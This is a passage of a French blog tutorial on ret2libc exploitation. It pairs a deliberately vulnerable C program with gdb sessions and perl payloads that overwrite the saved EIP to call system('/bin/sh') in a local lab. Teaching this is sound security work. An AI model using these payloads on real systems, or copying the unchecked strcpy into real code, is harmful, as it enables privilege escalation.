<!doctype html>
<html lang="fr-fr" class="no-js">

  <head>
    <link href="http://gmpg.org/xfn/11" rel="profile" hreflang="fr">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
  
    <meta name="google-site-verification" content="JeRPv2CEcpONAy8C7dMr1nzjlpZxlxYCtt2PnuQ78g8" />
    <!-- Enable responsiveness on mobile devices-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  
    <title>
      
        Retour à la libc - hackndo
      
    </title>

	<link rel="stylesheet" href="/assets/css/style.css?v=1.13"> <!-- Resource style -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Signika:600"> <!-- Logo font -->
    <script src="/assets/js/modernizr.js"></script> <!-- Modernizr -->
    
    <link rel="apple-touch-icon" sizes="57x57" href="/assets/icones/favicon/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/assets/icones/favicon/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/assets/icones/favicon/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/assets/icones/favicon/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/assets/icones/favicon/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/assets/icones/favicon/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/assets/icones/favicon/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/assets/icones/favicon/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/icones/favicon/apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icones/favicon/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/icones/favicon/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="/assets/icones/favicon/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/assets/icones/favicon/favicon-16x16.png">
    <link rel="manifest" href="/assets/res/manifest.json">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/assets/icones/favicon/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
  	
	<!-- RSS -->
    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="hackndo" />

    <!-- Twitter card -->
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:site" content="@hackanddo" />
    <meta name="twitter:creator" content="@hackanddo" />
    <meta name="twitter:title" content="Retour à la libc" />
    <meta name="twitter:description" content="Article sur le retour à la libc, avec la théorie et des exemples" />
    
    <meta name="twitter:image" content="http://localhost:4000/assets/uploads/2015/05/retli.jpg" />
    
  
    <!-- Google analytics -->
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  
      ga('create', 'UA-80312745-1', 'auto');
      ga('send', 'pageview');
  
    </script>
    <!-- Begin Jekyll SEO tag v2.6.1 -->
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="Retour à la libc" />
<meta name="author" content="Pixis" />
<meta property="og:locale" content="fr_FR" />
<meta name="description" content="Article sur le retour à la libc, avec la théorie et des exemples" />
<meta property="og:description" content="Article sur le retour à la libc, avec la théorie et des exemples" />
<link rel="canonical" href="http://localhost:4000/retour-a-la-libc/" />
<meta property="og:url" content="http://localhost:4000/retour-a-la-libc/" />
<meta property="og:site_name" content="hackndo" />
<meta property="og:image" content="http://localhost:4000/assets/uploads/2015/05/retli.jpg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2015-05-24T21:38:43+02:00" />
<script type="application/ld+json">
{"image":"http://localhost:4000/assets/uploads/2015/05/retli.jpg","@type":"BlogPosting","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/icones/logo.png"},"name":"Pixis"},"url":"http://localhost:4000/retour-a-la-libc/","headline":"Retour à la libc","dateModified":"2015-05-24T21:38:43+02:00","datePublished":"2015-05-24T21:38:43+02:00","author":{"@type":"Person","name":"Pixis"},"description":"Article sur le retour à la libc, avec la théorie et des exemples","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/retour-a-la-libc/"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

</head>

  <body>
    <header class="cd-main-header">
    <a href="/" class="cd-logo"><img src="/assets/icones/logo.png" /> <span class="cd-logo-title">hackndo</span></a>
		
    <a href="#0" class="cd-nav-trigger">Menu<span></span></a>

</header> <!-- .cd-main-header -->
    <main class="cd-main-content">
		<nav class="cd-side-nav">
            <div class="sidebar-about">
    <h1>
        <img id="site-logo" src="/assets/icones/logo.png" alt="logo" title="logo" />
        <a class="sidebar-title" href="/">
        hackndo
        </a>
    </h1>
    <p class="lead">Think out of the box</p>
</div>

<ul>
    <li class="cd-label">Blog</li>
    <li class="">
        <a href="/">Home</a>
    </li>
    
    
        
            
        
    
        
            
                <li class="">
                    <a href="/about/">À propos</a>
                </li>
            
        
    
        
            
                <li class="">
                    <a href="/archives/">Archives</a>
                </li>
            
        
    
        
            
                <li class="">
                    <a href="/contact/">Me contacter</a>
                </li>
            
        
    
        
            
                <li class="">
                    <a href="/disclaimer/">Disclaimer</a>
                </li>
            
        
    
        
    
        
            
        
    
        
            
                <li class="">
                    <a href="/projects/">Projets</a>
                </li>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
    
        
    
</ul>
<ul>
    <li class="cd-label">Liens</li>
    <li><a href="https://www.dailysecurity.fr/" target="_blank">Blog de Geluchat</a></li>
    <li><a href="http://lsdsecdaemon.com" target="_blank">Blog de Th3_l5D</a></li>
    <li><a href="http://inf0sec.fr" target="_blank">Blog de Matthieu</a></li>
</ul>
<p class="sidebar-copyright">&copy; 2019. Tous droits réservés.</p>
<div class="sidebar-social">
<ul>
  <li><a href="https://twitter.com/HackAndDo" title="Twitter" target="_blank"><img alt="Twitter" title="Twitter" src="/assets/icones/social/twitter.png" /></a></li>
  <li><a href="https://github.com/hackndo" title="Github" target="_blank"><img title="Github" alt="Github" src="/assets/icones/social/github.png" /></a></li>
  <li><a href="https://www.youtube.com/channel/UC9WYWHLdu9TK-0Hu3wcHJ9g" title="Youtube" target="_blank"><img title="Youtube" alt="Youtube" src="/assets/icones/social/youtube.png" /></a></li>
  <li><a href="https://discord.gg/9At6SUZ" title="Discord" target="_blank"><img title="Discord" alt="Discord" src="/assets/icones/social/discord.png" /></a></li>
  <li><a href="https://www.linkedin.com/in/romainbentz/" title="LinkedIn" target="_blank"><img title="LinkedIn" alt="LinkedIn" src="/assets/icones/social/linkedin.png" /></a></li>
  <li><a href="https://sh.hackndo.com" title="Shell" target="_blank"><img title="Shell" alt="Shell" src="/assets/icones/social/shell.png" /></a></li>
  <li><a href="/feed.xml" title="RSS" target="_blank"><img title="RSS" alt="RSS" src="/assets/icones/social/rss.png" /></a></li>
  <li><a href="https://ko-fi.com/hackndo" title="Ko-Fi" target="_blank"><img title="Ko-Fi" alt="Ko-Fi" src="/assets/icones/social/kofi.gif" /></a></li>
</ul>
</div>
        </nav>

        <div class="content-wrapper">
            <div class="post">
  
  <div class="post-cover">
    <img src="/assets/uploads/2015/05/retli.jpg" alt="Retour à la libc" title="Retour à la libc" />
  </div>
  
  <h1 class="post-title">Retour à la libc</h1>
  <div class="post-info">
      <p class="alignleft">24 May 2015 <a class="post-comments-count" href="http://http://localhost:4000/retour-a-la-libc/#disqus_thread"></a></p>
      <p class="alignright">Auteur : <strong><a href="https://twitter.com/HackAndDo">Pixis</a></strong></p>
      <div class="keywords">
        <span class="post-tags"><a href="/archives/#user-land"><i class="fas fa-tags"></i> User Land</a><a href="/archives/#linux"><i class="fas fa-tags"></i> Linux</a></span>
      </div>
</div>

  <article>
  <p>Bonjour, nous avons vu dans la série d’articles précédents comment fonctionnait la mémoire d’un processus au sein d’un système Unix. Grâce à cette compréhension, nous avons exposé une vulnérabilité très connue qu’est le dépassement de tampon en utilisant la pile (<em>buffer overflow stack based</em>).</p>

<!--more-->

<h2 id="rappels">Rappels</h2>

<p>Pour rappel, le buffer overflow est une vulnérabilité présente lorsque le programmeur ne vérifie pas la taille d’une variable fournie par l’utilisateur, et qu’il stocke cette variable en mémoire. Il est alors possible pour l’attaquant d’entrer une valeur de taille supérieure à ce qui était prévu, et lorsque cette valeur (appelée <em>buffer</em>) est copiée en mémoire, elle dépasse de l’espace qui lui était alloué (dépassement de tampon).</p>

<p>Cela peut engendrer une erreur de segmentation car ce dépassement va probablement écraser la sauvegarde du registre EIP (sauvegarde effectuée afin que lorsque la fonction en cours se termine, le processeur retrouve l’adresse de l’instruction suivant l’appel de cette fonction), donc comme EIP est partiellement ou totalement écrasé, les chances sont fortes pour que cette nouvelle valeur pointe soit vers une zone mémoire non autorisée en lecture, soit vers une zone mémoire contenant des instructions non valides.</p>

<p>Cependant, si l’attaquant fourni une adresse mémoire soigneusement choisie pour pointer vers un code malveillant (placé dans le buffer, dans nos exemples précédents, d’où le <em>stack based</em>), alors le flow d’exécution du programme peut être modifié, et l’attaquant peut faire ce qu’on appelle une <strong>escalade de privilèges</strong> (sous réserve que le programme en question appartenait à un utilisateur avec des droits plus élevés et que le programme était SUID, c’est à dire qu’il s’exécutait avec les droits du propriétaire de ce logiciel)</p>

<h2 id="protections-contre-les-bof">Protections contre les BoF</h2>

<p>Dans l’<a href="../buffer-overflow/">article sur les buffer overflows</a>, nous avions placé notre code malveillant (shellcode) dans le buffer, qui se trouvait quelque part dans la pile. Nous aurions pu le placer à d’autres endroits (dans une variable d’environnement, par exemple, qui se trouve également sur la pile lors de l’exécution du programme), pourvu que nous puissions trouver son adresse mémoire.</p>

<p>Certaines protections existent pour se protéger des buffer overflows. Une des premières barrières a été de rendre la pile non exécutable. Ainsi, l’attaquant place son shellcode dans le buffer, ou dans une variable d’environnement (placée sur la pile), mais lorsque le flow d’exécution est redirigé vers son code, celui-ci ne s’exécute pas.</p>

<p>Voici une commande permettant de connaitre les flags de la pile :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>readelf <span class="nt">-l</span> add32 | <span class="nb">grep </span>GNU_STACK

Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
</code></pre></div></div>

<p><em>J’ai ajouté la ligne qui indique le nom des colonnes pour une meilleure compréhension.</em></p>

<p>On remarque la présence des deux flags RW (Read - Write), mais l’absence du flag E (Execute), donc la pile n’est pas exécutable. Mais alors, comment pouvons nous exploiter l’oubli de vérification de la taille du buffer ?</p>

<h2 id="contournement--ret2libc">Contournement : ret2libc</h2>

<p>L’idée est d’utiliser des fonctions déjà programmée, contenues dans la <strong>libc</strong>, à notre avantage (Libraire C, libraire contenant toutes les fonctions standards telles que printf, scanf, system, strlen, strcpy …). Avant, nous faisions quelque chose comme cela pour lancer notre shellcode (shellcode qui ne faisait rien d’autre qu’un appel système à execve avec comme paramètre <code class="highlighter-rouge">"/bin/sh"</code>)</p>

<p><img src="/assets/uploads/2015/03/img_54f78559832ab.png?w=640&quot; alt=&quot;&quot; data-recalc-dims=&quot;1" alt="img" /></p>

<p>Cependant, comme nous ne pouvons plus exécuter le shellcode situé sur la pile, nous allons changer notre technique, et nous allons appeler directement la fonction <code class="highlighter-rouge">system()</code> de la libc, en lui fournissant comme argument la chaine de caractère <code class="highlighter-rouge">"/bin/sh"</code>.</p>

<h3 id="organisation-de-la-pile">Organisation de la pile</h3>

<p>Pour cela, il faut bien comprendre <a href="/fonctionnement-de-la-pile/">le fonctionnement de la pile</a> et la préparer soigneusement pour que l’appel soit fait correctement. Pour nous aider, nous allons étudier le comportement de la pile avec un programme de test :</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">command</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span>
    <span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Ce programme lance la commande system(), avec en argument la chaine de caractères <code class="highlighter-rouge">"/bin/sh"</code>. Si nous le compilons et le désassemblons au sein de gdb, voici le résultat obtenu</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gcc <span class="nt">-m32</span> appel_system.c <span class="nt">-o</span> appel_system
<span class="nv">$ </span>gdb appel_system
gdb<span class="nv">$ </span>disass main
Dump of assembler code <span class="k">for function </span>main:
   0x0804841c &lt;+0&gt;:     push   ebp
   0x0804841d &lt;+1&gt;:     mov    ebp,esp
   0x0804841f &lt;+3&gt;:     and    esp,0xfffffff0
   0x08048422 &lt;+6&gt;:     sub    esp,0x20
   0x08048425 &lt;+9&gt;:     mov    DWORD PTR <span class="o">[</span>esp+0x18],0x6e69622f
   0x0804842d &lt;+17&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x1c],0x68732f
   0x08048435 &lt;+25&gt;:    lea    eax,[esp+0x18]
   0x08048439 &lt;+29&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
   0x0804843c &lt;+32&gt;:    call   0x8048300 &lt;system@plt&gt;
   0x08048441 &lt;+37&gt;:    mov    eax,0x0
   0x08048446 &lt;+42&gt;:    leave
   0x08048447 &lt;+43&gt;:    ret
End of assembler dump.
</code></pre></div></div>

<p>Nous voyons le call vers la fonction system() à la ligne +32. Aux lignes +9 et +17, nous voyons que notre chaine de caractères <code class="highlighter-rouge">"/bin/sh"</code>; est enregistrée à esp+0x18, sachant que 0x6e69622f est la représentation ASCII de <code class="highlighter-rouge">/bin</code>; et 0x68732f de <code class="highlighter-rouge">/sh</code>; (en Little Endian). Ensuite, à la ligne +25, l’adresse valant esp+0x18 est placée dans EAX, puis EAX est mis au sommet de la pile, pointé par ESP. Donc si nous plaçons un breakpoint sur le call, nous devrions voir notre chaine de caractères sur le sommet de la pile :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb<span class="nv">$ </span>b <span class="k">*</span>0x0804843c
Breakpoint 1 at 0x804843c
gdb<span class="nv">$ </span>r
<span class="nt">--------------------------------------------------------------------------</span><span class="o">[</span>regs]
  EAX: 0xBFFFF388  EBX: 0xB7FCEFF4  ECX: 0x308D58E7  EDX: 0x00000001  o d I t S z a p c
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF398  ESP: 0xBFFFF370  EIP: 0x0804843C
  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002B
<span class="nt">--------------------------------------------------------------------------</span>

<span class="o">=&gt;</span> 0x804843c &lt;main+32&gt;:    call   0x8048300 &lt;system@plt&gt;
   0x8048441 &lt;main+37&gt;:    mov    eax,0x0
   0x8048446 &lt;main+42&gt;:    leave
   0x8048447 &lt;main+43&gt;:    ret
   0x8048448:    nop
   0x8048449:    nop
   0x804844a:    nop
   0x804844b:    nop
<span class="nt">--------------------------------------------------------------------------------</span>

Breakpoint 1, 0x0804843c <span class="k">in </span>main <span class="o">()</span>
gdb<span class="nv">$ </span>x/xw <span class="nv">$esp</span>
0xbffff370:    0xbffff388
gdb<span class="nv">$ </span>x/s 0xbffff388
0xbffff388:     <span class="s2">"/bin/sh"</span>
</code></pre></div></div>

<p><em>Vous aurez peut-être remarqué que certaines informations que nous n’avons pas explicitement demandées sont tout de même affichées. C’est parce que j’utilise un .gdbinit particulier, qui m’affiche les instructions à venir ainsi que l’état des registres à chaque fois que j’avance dans l’exécution du programme.</em></p>

<p>Tout se passe comme prévu. Voici à quoi ressemble la pile à l’état actuel :</p>

<p><img src="/assets/uploads/2015/05/img_5562042840252.png" alt="etat de la pile" /></p>

<p>Ensuite, le call va être effectué. Rappelez-vous que l’instruction call vers une adresse est une simplification d’écriture, car elle équivaut à deux instructions :</p>

<pre><code class="language-asm">call &lt;adresse&gt;
; est un alias de
PUSH EIP
JMP &lt;adresse&gt;
</code></pre>

<p>Vous vous doutiez sûrement du fait qu’un JMP était effectué, puisque l’instruction qui sera exécutée juste après est celle située à l’adresse fournie au call, cependant, il ne faut surtout pas oublier que EIP est poussé sur la pile afin de retenir l’instruction qui suivait le call, instruction qui sera remise dans EIP à la fin de la fonction appelée. Pour en avoir le cœur net, vérifions-le dans gdb. Retenons dans un coin de notre tête l’adresse de l’instruction qui suit le call system (0x8048441)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb<span class="nv">$ </span>si
<span class="o">[</span>...]
0x08048300 <span class="k">in </span>system@plt <span class="o">()</span>
gdb<span class="nv">$ </span>x/4xw <span class="nv">$esp</span>
0xbffff36c:    0x08048441    0xbffff388    0xbffff444    0xbffff44c
</code></pre></div></div>

<p>Nous avons suivi le call, et nous remarquons bien que l’ancien EIP 0x8048441 a été poussé sur la pile, il est donc juste au dessus de l’adresse de notre chaine “/bin/sh”, et la suite du programme peut s’exécuter normalement. La pile ressemble donc à ça :</p>

<p><a href="/assets/uploads/2015/05/img_5562044bc46a3.png"><img src="/assets/uploads/2015/05/img_5562044bc46a3.png" alt="img_5562044bc46a3" /></a></p>

<p>Maintenant que nous avons une bonne compréhension de la pile lors d’un appel à la fonction system(“/bin/sh”), nous pouvons nous attaquer à l’exploitation d’un buffer overflow avec un retour à la libc.</p>

<h3 id="exploitation---théorie">Exploitation - Théorie</h3>

<p>Comme nous l’avons évoqué tout à l’heure, nous pouvons écraser la valeur de retour de la fonction dans laquelle se trouve la vulnérabilité. Lorsque la fonction se termine et fait appel à l’instruction RET, c’est en fait un POP EIP qui est effectué, suivi d’un JMP EIP. Le POP EIP prend la valeur qui est sur le sommet de la pile, et l’enregistre dans le registre EIP. Comme nous contrôlons cette valeur (grâce au BoF), nous contrôlons le JMP EIP.</p>

<p><a href="/assets/uploads/2015/05/img_556205b53cf28.png"><img src="/assets/uploads/2015/05/img_556205b53cf28.png" alt="img_556205b53cf28" /></a></p>

<p>Nous allons donc simuler un appel valide à la fonction system() en arrangeant la pile correctement pour que la fonction system() lance un shell. Nous avons vu dans l’exemple de l’appel à system() quel devait être l’état de la pile lorsque la fonction system() débutait :</p>

<p><a href="/assets/uploads/2015/05/img_556206de318fa.png"><img src="/assets/uploads/2015/05/img_556206de318fa.png" alt="img_556206de318fa" /></a></p>

<p>En effet, il faut qu’il y ait l’adresse de retour sur le dessus de la pile, et juste en dessous l’adresse de la chaine de caractère passée en argument à la fonction system(). Donc si nous exploitons le buffer overflow, et que nous fournissons l’adresse de la fonction system() dans la sauvegarde de EIP, voici quel devrait être l’état de la pile :</p>

<p><a href="/assets/uploads/2015/05/img_5562069a3bd6f.png"><img src="/assets/uploads/2015/05/img_5562069a3bd6f.png" alt="img_5562069a3bd6f" /></a></p>

<p>Comme nous allons lancer un shell via l’appel à system(), l’adresse de retour ne nous importe pas vraiment, donc nous pourrons mettre n’importe quoi.</p>

<p>Pour pouvoir mettre la pile dans cet état, il faudra donc envoyer au programme un buffer sous cette forme :</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ buffer permettant d'atteindre l'overflow ] [ Adresse system() ] [ Adresse retour ] [ Adresse "/bin/sh" ]
</code></pre></div></div>

<h3 id="exploitation---par-lexemple">Exploitation - Par l’exemple</h3>

<p>C’était un long préambule, mais il était nécessaire pour pouvoir bien comprendre les rouages de cette technique. Sans plus attendre, nous allons l’exploiter avec un exemple simple</p>

<p>Je précise que j’ai fait <a href="https://www.youtube.com/watch?v=M7NQfGobQNo" target="blank">une vidéo</a> qui permet d’illustrer ce même exemple !</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="n">printf</span><span class="p">(</span><span class="s">"binary &lt;chaine&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">else</span> <span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Ce code est le même que celui fourni en exemple dans le deuxième cas pratique de l’article sur les <a href="/buffer-overflow">buffer overflows</a>. Voici le comportement attendu de ce programme :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./ret2libc hackndo
hackndo
<span class="nv">$ </span>./ret2libc hackndoisawesome
hackndoisawesome
Segmentation fault
</code></pre></div></div>

<p>Je ne vais pas revenir sur les bases de l’overflow expliquées dans les articles précédents. Dans gdb, nous trouvons le nombre exact de caractères à envoyer pour réécrire EIP</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb<span class="nv">$ </span>r <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "A"x20 . "\xef\xbe\xad\xde"'</span><span class="si">)</span>
AAAAAAAAAAAAAAAAAAAAﾭ�

Program received signal SIGSEGV, Segmentation fault.
<span class="nt">--------------------------------------------------------------------------</span><span class="o">[</span>regs]
  EAX: 0x00000019  EBX: 0xB7FCEFF4  ECX: 0xB7FCF4E0  EDX: 0xB7FD0360  o d I t s Z a P c
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x41414141  ESP: 0xBFFFF360  EIP: 0xDEADBEEF
  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError <span class="k">while </span>running hook_stop:
Cannot access memory at address 0xdeadbeef
0xdeadbeef <span class="k">in</span> ?? <span class="o">()</span>
</code></pre></div></div>

<p>Il faut donc 20 octets de buffer, puis les 4 octets suivants remplacent la sauvegarde de <code class="highlighter-rouge">EIP</code>, ce qui fait qu’au retour de la fonction (l’instruction <code class="highlighter-rouge">RET</code> effectuant un <code class="highlighter-rouge">POP EIP</code> puis <code class="highlighter-rouge">JMP EIP</code>), le programme plante car il ne peut pas accéder à l’adresse fournie, <code class="highlighter-rouge">0xdeadbeef</code> ici.</p>

<p>Rappelons que nous voulons mettre la stack dans l’état suivant :</p>

<p><a href="/assets/uploads/2015/05/img_5562069a3bd6f.png"><img src="/assets/uploads/2015/05/img_5562069a3bd6f.png" alt="img_5562069a3bd6f" /></a></p>

<p>Nous venons de trouver l’adresse de la sauvegarde de <code class="highlighter-rouge">EIP</code>, il s’agit maintenant de trouver l’adresse de la fonction <code class="highlighter-rouge">system()</code>.  Pour cela, rien de plus simple, il suffit de lancer la commande <code class="highlighter-rouge">print system</code> ou <code class="highlighter-rouge">p system</code> dans gdb</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb<span class="nv">$ </span>p system
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7ea9e20 &lt;system&gt;
</code></pre></div></div>

<p>L’adresse de la fonction <code class="highlighter-rouge">system</code> est donc <code class="highlighter-rouge">0xb7ea9e20</code>.</p>

<p>Vient alors le tour de la chaine de caractère <code class="highlighter-rouge">"/bin/sh"</code>. Dans un premier temps, il peut être possible de trouver cette chaine de caractères de manière un peu brutale mais rapide (merci <strong>Mastho</strong> pour l’astuce !), via la commande suivante dans gdb :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> find __libc_start_main,+99999999,<span class="s2">"/bin/sh"</span>
0xb7fa92e8
warning: Unable to access target memory at 0xb7fd03f0, halting search.
1 pattern found.
</code></pre></div></div>

<p>Cette commande effectue une recherche dans une plage mémoire commençant au début de la fonction <code class="highlighter-rouge">__libc_start_main()</code> (appelée avant notre fonction <code class="highlighter-rouge">main</code>), et d’une taille de 99 999 999 octets (Pour être sûr). Oui la méthode est violente mais elle a le mérite d’être rapide ! Nous avons donc un endroit dans la mémoire où se situe la chaine recherchée, à l’adresse <code class="highlighter-rouge">0xb7fa92e8</code> ! Pour nous en convaincre :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/s 0xb7fa92e8
0xb7fa92e8:     <span class="s2">"/bin/sh"</span>
</code></pre></div></div>

<p>Pratique non ?</p>

<p>Si jamais cette chaine (ou une autre que vous recherchez) n’est pas présente dans la mémoire du binaire (par exemple la chaine <code class="highlighter-rouge">"I Love Ricard"</code>, au hasard, mais on va continuer avec <code class="highlighter-rouge">"/bin/sh"</code>), il existe divers moyens de la stocker, nous allons par exemple la stocker dans une variable d’environnement</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb<span class="nv">$ </span><span class="nb">set </span>environment <span class="nv">HACKNDO</span><span class="o">=</span>/bin/sh
gdb<span class="nv">$ </span>x/s <span class="k">*</span><span class="o">((</span>char <span class="k">**</span><span class="o">)</span> environ+7<span class="o">)</span>
0xbffff6ca:     <span class="s2">"HACKNDO=/bin/sh"</span>
gdb<span class="nv">$ </span>x/s 0xbffff6d2
0xbffff6d2:     <span class="s2">"/bin/sh"</span>
</code></pre></div></div>

<p>Une fois stockée, avec un tout petit peu de tâtonnement, nous trouvons son adresse en mémoire, que nous allons utiliser pour la suite.</p>

<p>Nous avons donc maintenant tous les éléments nécessaire pour pouvoir lancer notre attaque ret2libc, avec un payload comme suit :</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ 20 x "A" ] [ 0xb7ea9e20 ] [ OSEF ] [ 0xbffff6d2 ]
</code></pre></div></div>

<p>Voici le résultat :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb<span class="nv">$ </span>r <span class="s2">"</span><span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "A"x20 . "\x20\x9e\xea\xb7" . "OSEF" . "\xd2\xf6\xff\xbf"'</span><span class="si">)</span><span class="s2">"</span>
AAAAAAAAAAAAAAAAAAAA ��OSEF����
<span class="nv">$ </span>
</code></pre></div></div>

<p>On a obtenu notre shell ! Félicitations !</p>

<p>Pour rendre cette exploitation plus propre, au lieu de mettre une adresse de retour aléatoire, nous pourrions mettre l’adresse de la fonction <code class="highlighter-rouge">exit()</code>. Voici rapidement comment ça se passe</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb<span class="nv">$ </span>r <span class="s2">"</span><span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "A"x20 . "\x20\x9e\xea\xb7" . "OSEF" . "\xd2\xf6\xff\xbf"'</span><span class="si">)</span><span class="s2">"</span>
AAAAAAAAAAAAAAAAAAAA ��OSEF����

<span class="nv">$ </span><span class="nb">exit

</span>Program received signal SIGSEGV, Segmentation fault.
<span class="nt">--------------------------------------------------------------------------</span><span class="o">[</span>regs]
  EAX: 0x00000000  EBX: 0xB7FCEFF4  ECX: 0xBFFFF288  EDX: 0x00000000  o d I t S z A P c
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x41414141  ESP: 0xBFFFF344  EIP: 0x4645534F
  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError <span class="k">while </span>running hook_stop:
Cannot access memory at address 0x4645534f
0x4645534f <span class="k">in</span> ?? <span class="o">()</span>
</code></pre></div></div>

<p>Cherchons alors l’adresse de <code class="highlighter-rouge">exit()</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb<span class="nv">$ </span>p <span class="nb">exit</span>
<span class="nv">$3</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e9d530 &lt;<span class="nb">exit</span><span class="o">&gt;</span>
gdb<span class="nv">$ </span>r <span class="s2">"</span><span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "A"x20 . "\x20\x9e\xea\xb7" . "\x30\xd5\xe9\xb7" . "\xd2\xf6\xff\xbf"'</span><span class="si">)</span><span class="s2">"</span>
AAAAAAAAAAAAAAAAAAAA ��0������

<span class="nv">$ </span><span class="nb">exit</span>
